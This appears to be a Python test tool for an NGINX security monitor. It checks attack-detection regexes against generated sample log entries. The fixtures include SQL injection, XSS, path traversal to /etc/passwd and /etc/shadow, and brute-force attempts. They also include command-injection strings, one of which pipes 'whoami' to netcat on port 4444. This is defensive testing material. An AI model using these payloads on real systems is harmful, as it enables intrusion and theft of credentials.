@@ -1,0 +1,383 @@
+#!/usr/bin/env python3
+"""
+NGINX Security Monitor - Pattern Testing Tool
+Test and validate attack pattern detection with sample data.
+"""
+
+import os
+import sys
+import argparse
+import json
+import time
+import re
+from pathlib import Path
+from datetime import datetime, timedelta
+
+# Add the src directory to Python path
+sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "src"))
+
+def print_test_header():
+    """Print testing header."""
+    print("🔍 NGINX Security Monitor - Pattern Testing")
+    print("=" * 50)
+
+def load_patterns(patterns_file):
+    """Load patterns from configuration file."""
+    try:
+        with open(patterns_file, 'r') as f:
+            patterns = json.load(f)
+        
+        print(f"✅ Loaded patterns from: {patterns_file}")
+        print(f"   📊 Found {len(patterns.get('attack_patterns', {}))} attack patterns")
+        return patterns
+        
+    except FileNotFoundError:
+        print(f"❌ Patterns file not found: {patterns_file}")
+        return None
+    except json.JSONDecodeError as e:
+        print(f"❌ Invalid JSON in patterns file: {e}")
+        return None
+
+def generate_test_logs():
+    """Generate realistic test log entries."""
+    test_logs = {
+        'sql_injection': [
+            '192.168.1.100 - - [21/Jul/2025:10:15:30 +0000] "GET /admin.php?id=1\' OR 1=1-- HTTP/1.1" 200 1234',
+            '10.0.0.50 - - [21/Jul/2025:10:16:45 +0000] "POST /login.php HTTP/1.1" 200 567 "username=admin&password=\' UNION SELECT * FROM users--"',
+            '172.16.0.10 - - [21/Jul/2025:10:17:12 +0000] "GET /search.php?q=test\'; DROP TABLE users; -- HTTP/1.1" 404 890'
+        ],
+        'xss': [
+            '192.168.1.200 - - [21/Jul/2025:10:20:15 +0000] "GET /comment.php?msg=<script>alert(\'XSS\')</script> HTTP/1.1" 200 456',
+            '10.0.0.75 - - [21/Jul/2025:10:21:30 +0000] "POST /feedback.php HTTP/1.1" 200 789 "comment=<img src=x onerror=alert(1)>"',
+            '172.16.0.25 - - [21/Jul/2025:10:22:45 +0000] "GET /profile.php?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E HTTP/1.1" 200 123'
+        ],
+        'path_traversal': [
+            '192.168.1.150 - - [21/Jul/2025:10:25:10 +0000] "GET /download.php?file=../../../etc/passwd HTTP/1.1" 403 234',
+            '10.0.0.60 - - [21/Jul/2025:10:26:25 +0000] "GET /view.php?page=....//....//....//etc/shadow HTTP/1.1" 403 345',
+            '172.16.0.15 - - [21/Jul/2025:10:27:40 +0000] "GET /include.php?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 403 456'
+        ],
+        'brute_force': [
+            '192.168.1.250 - - [21/Jul/2025:10:30:05 +0000] "POST /wp-login.php HTTP/1.1" 401 567 "log=admin&pwd=password123"',
+            '192.168.1.250 - - [21/Jul/2025:10:30:10 +0000] "POST /wp-login.php HTTP/1.1" 401 567 "log=admin&pwd=admin123"',
+            '192.168.1.250 - - [21/Jul/2025:10:30:15 +0000] "POST /wp-login.php HTTP/1.1" 401 567 "log=admin&pwd=qwerty123"',
+            '192.168.1.250 - - [21/Jul/2025:10:30:20 +0000] "POST /wp-login.php HTTP/1.1" 401 567 "log=admin&pwd=letmein"',
+            '192.168.1.250 - - [21/Jul/2025:10:30:25 +0000] "POST /wp-login.php HTTP/1.1" 401 567 "log=admin&pwd=password"'
+        ],
+        'suspicious_user_agents': [
+            '192.168.1.50 - - [21/Jul/2025:10:35:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "sqlmap/1.4.7"',
+            '10.0.0.30 - - [21/Jul/2025:10:36:15 +0000] "GET /admin HTTP/1.1" 200 567 "-" "Nikto/2.1.6"',
+            '172.16.0.5 - - [21/Jul/2025:10:37:30 +0000] "GET /test.php HTTP/1.1" 200 890 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"'
+        ],
+        'legitimate': [
+            '192.168.1.10 - - [21/Jul/2025:10:40:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"',
+            '10.0.0.20 - - [21/Jul/2025:10:41:15 +0000] "GET /about.html HTTP/1.1" 200 567 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"',
+            '172.16.0.30 - - [21/Jul/2025:10:42:30 +0000] "POST /contact.php HTTP/1.1" 200 890 "https://example.com/contact.html" "Mozilla/5.0 (X11; Linux x86_64)"'
+        ]
+    }
+    
+    return test_logs
+
+def test_pattern_against_logs(pattern_name, pattern_config, test_logs, verbose=False):
+    """Test a single pattern against test logs."""
+    print(f"\n🧪 Testing pattern: {pattern_name}")
+    print(f"   Description: {pattern_config.get('description', 'No description')}")
+    print(f"   Severity: {pattern_config.get('severity', 'unknown')}")
+    
+    # Get pattern regex
+    pattern_regex = pattern_config.get('pattern', '')
+    if not pattern_regex:
+        print("   ❌ No pattern regex found")
+        return False
+    
+    if verbose:
+        print(f"   Regex: {pattern_regex}")
+    
+    try:
+        compiled_pattern = re.compile(pattern_regex, re.IGNORECASE)
+    except re.error as e:
+        print(f"   ❌ Invalid regex pattern: {e}")
+        return False
+    
+    matches_found = 0
+    false_positives = 0
+    
+    # Test against all log categories
+    for category, logs in test_logs.items():
+        category_matches = 0
+        
+        for log_entry in logs:
+            if compiled_pattern.search(log_entry):
+                category_matches += 1
+                matches_found += 1
+                
+                if verbose:
+                    print(f"   ✅ Match in {category}: {log_entry}")
+        
+        # Check for expected behavior
+        if category == 'legitimate' and category_matches > 0:
+            false_positives += category_matches
+            print(f"   ⚠️  {category_matches} false positives in legitimate traffic")
+        elif category != 'legitimate' and category_matches > 0:
+            print(f"   ✅ {category_matches} matches in {category} logs")
+    
+    # Pattern performance summary
+    print(f"   📊 Total matches: {matches_found}")
+    if false_positives > 0:
+        print(f"   ⚠️  False positives: {false_positives}")
+        return False
+    else:
+        print(f"   ✅ No false positives detected")
+        return True
+
+def run_performance_benchmark(patterns, test_logs, iterations=1000):
+    """Run performance benchmark for pattern matching."""
+    print(f"\n⚡ Running performance benchmark ({iterations} iterations)...")
+    
+    all_logs = []
+    for logs in test_logs.values():
+        all_logs.extend(logs)
+    
+    compiled_patterns = {}
+    for name, config in patterns.get('attack_patterns', {}).items():
+        try:
+            compiled_patterns[name] = re.compile(config.get('pattern', ''), re.IGNORECASE)
+        except re.error:
+            continue
+    
+    start_time = time.time()
+    
+    for _ in range(iterations):
+        for log_entry in all_logs:
+            for pattern in compiled_patterns.values():
+                pattern.search(log_entry)
+    
+    end_time = time.time()
+    total_time = end_time - start_time
+    
+    ops_per_second = (iterations * len(all_logs) * len(compiled_patterns)) / total_time
+    
+    print(f"   📊 Performance Results:")
+    print(f"      • Total time: {total_time:.3f} seconds")
+    print(f"      • Operations: {iterations * len(all_logs) * len(compiled_patterns):,}")
+    print(f"      • Ops/second: {ops_per_second:,.0f}")
+    print(f"      • Logs/second: {(iterations * len(all_logs)) / total_time:,.0f}")
+
+def generate_custom_attack_scenarios():
+    """Generate custom attack scenarios for testing."""
+    scenarios = {
+        'advanced_sql_injection': [
+            "GET /search.php?q=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- HTTP/1.1",
+            "POST /login.php HTTP/1.1\nContent-Length: 50\n\nusername=admin' AND 1=1 UNION SELECT @@version--&password=test",
+            "GET /user.php?id=1 AND 1=2 UNION SELECT null,username,password FROM users-- HTTP/1.1"
+        ],
+        'xss_variations': [
+            "GET /comment.php?msg=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E HTTP/1.1",
+            "POST /feedback.php HTTP/1.1\nContent-Length: 45\n\ncomment=<svg onload=alert(String.fromCharCode(88,83,83))>",
+            "GET /search.php?q=javascript:alert('XSS') HTTP/1.1"
+        ],
+        'advanced_traversal': [
+            "GET /download.php?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1",
+            "GET /include.php?path=....//....//....//etc/shadow HTTP/1.1",
+            "GET /view.php?page=....\\....\\....\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1"
+        ],
+        'command_injection': [
+            "GET /ping.php?host=8.8.8.8;cat%20/etc/passwd HTTP/1.1",
+            "POST /system.php HTTP/1.1\nContent-Length: 30\n\ncmd=ls -la && cat /etc/passwd",
+            "GET /exec.php?cmd=whoami|nc 192.168.1.100 4444 HTTP/1.1"
+        ]
+    }
+    
+    return scenarios
+
+def create_test_report(results, output_file=None):
+    """Create a detailed test report."""
+    report = {
+        'test_summary': {
+            'timestamp': datetime.now().isoformat(),
+            'total_patterns_tested': len(results),
+            'passed_patterns': len([r for r in results if r['passed']]),
+            'failed_patterns': len([r for r in results if not r['passed']])
+        },
+        'pattern_results': results
+    }
+    
+    if output_file:
+        try:
+            with open(output_file, 'w') as f:
+                json.dump(report, f, indent=2)
+            print(f"\n📄 Test report saved to: {output_file}")
+        except Exception as e:
+            print(f"\n❌ Failed to save report: {e}")
+    
+    return report
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="Test and validate NGINX Security Monitor attack patterns",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  %(prog)s                           # Test all patterns with default logs
+  %(prog)s --patterns-file custom.json --verbose
+  %(prog)s --benchmark --iterations 5000
+  %(prog)s --generate-scenarios --output-dir test_logs/
+  %(prog)s --custom-logs access.log --report results.json
+        """
+    )
+    
+    parser.add_argument(
+        '--patterns-file',
+        default='config/patterns.json',
+        help='Path to patterns configuration file'
+    )
+    
+    parser.add_argument(
+        '--custom-logs',
+        help='Path to custom log file for testing'
+    )
+    
+    parser.add_argument(
+        '--verbose', '-v',
+        action='store_true',
+        help='Show detailed output including matched log entries'
+    )
+    
+    parser.add_argument(
+        '--benchmark',
+        action='store_true',
+        help='Run performance benchmark'
+    )
+    
+    parser.add_argument(
+        '--iterations',
+        type=int,
+        default=1000,
+        help='Number of iterations for benchmark (default: 1000)'
+    )
+    
+    parser.add_argument(
+        '--generate-scenarios',
+        action='store_true',
+        help='Generate advanced attack scenarios'
+    )
+    
+    parser.add_argument(
+        '--output-dir',
+        default='test_scenarios',
+        help='Output directory for generated scenarios'
+    )
+    
+    parser.add_argument(
+        '--report',
+        help='Save detailed test report to JSON file'
+    )
+    
+    parser.add_argument(
+        '--pattern',
+        help='Test only a specific pattern by name'
+    )
+    
+    args = parser.parse_args()
+    
+    print_test_header()
+    
+    # Load patterns
+    patterns = load_patterns(args.patterns_file)
+    if not patterns:
+        sys.exit(1)
+    
+    # Generate or load test logs
+    if args.custom_logs:
+        print(f"\n📂 Loading custom logs from: {args.custom_logs}")
+        try:
+            with open(args.custom_logs, 'r') as f:
+                custom_log_lines = f.readlines()
+            test_logs = {'custom': [line.strip() for line in custom_log_lines if line.strip()]}
+            print(f"   ✅ Loaded {len(test_logs['custom'])} log entries")
+        except Exception as e:
+            print(f"   ❌ Failed to load custom logs: {e}")
+            sys.exit(1)
+    else:
+        print(f"\n📋 Generating test log entries...")
+        test_logs = generate_test_logs()
+        total_logs = sum(len(logs) for logs in test_logs.values())
+        print(f"   ✅ Generated {total_logs} test log entries across {len(test_logs)} categories")
+    
+    # Generate advanced scenarios if requested
+    if args.generate_scenarios:
+        print(f"\n🎭 Generating advanced attack scenarios...")
+        scenarios = generate_custom_attack_scenarios()
+        
+        os.makedirs(args.output_dir, exist_ok=True)
+        
+        for scenario_name, logs in scenarios.items():
+            scenario_file = os.path.join(args.output_dir, f"{scenario_name}.log")
+            with open(scenario_file, 'w') as f:
+                for log_entry in logs:
+                    f.write(log_entry + '\n')
+            print(f"   ✅ Created scenario: {scenario_file}")
+        
+        print(f"\n📁 Scenarios saved to: {args.output_dir}")
+        if not args.benchmark:
+            return
+    
+    # Test patterns
+    results = []
+    attack_patterns = patterns.get('attack_patterns', {})
+    
+    if args.pattern:
+        # Test specific pattern
+        if args.pattern in attack_patterns:
+            pattern_config = attack_patterns[args.pattern]
+            passed = test_pattern_against_logs(args.pattern, pattern_config, test_logs, args.verbose)
+            results.append({
+                'pattern_name': args.pattern,
+                'passed': passed,
+                'config': pattern_config
+            })
+        else:
+            print(f"❌ Pattern '{args.pattern}' not found in patterns file")
+            sys.exit(1)
+    else:
+        # Test all patterns
+        print(f"\n🧪 Testing {len(attack_patterns)} patterns...")
+        for pattern_name, pattern_config in attack_patterns.items():
+            passed = test_pattern_against_logs(pattern_name, pattern_config, test_logs, args.verbose)
+            results.append({
+                'pattern_name': pattern_name,
+                'passed': passed,
+                'config': pattern_config
+            })
+    
+    # Performance benchmark
+    if args.benchmark:
+        run_performance_benchmark(patterns, test_logs, args.iterations)
+    
+    # Results summary
+    passed_count = len([r for r in results if r['passed']])
+    failed_count = len([r for r in results if not r['passed']])
+    
+    print(f"\n" + "="*60)
+    print(f"📊 PATTERN TESTING RESULTS")
+    print(f"="*60)
+    print(f"✅ Passed: {passed_count}")
+    print(f"❌ Failed: {failed_count}")
+    print(f"📊 Success Rate: {(passed_count / len(results) * 100):.1f}%")
+    
+    if failed_count > 0:
+        print(f"\n⚠️  Failed patterns:")
+        for result in results:
+            if not result['passed']:
+                print(f"   • {result['pattern_name']}")
+    
+    # Generate report
+    if args.report:
+        create_test_report(results, args.report)
+    
+    print(f"\n🎉 Pattern testing complete!")
+    
+    # Exit code based on results
+    sys.exit(0 if failed_count == 0 else 1)
+
+if __name__ == "__main__":
+    main()
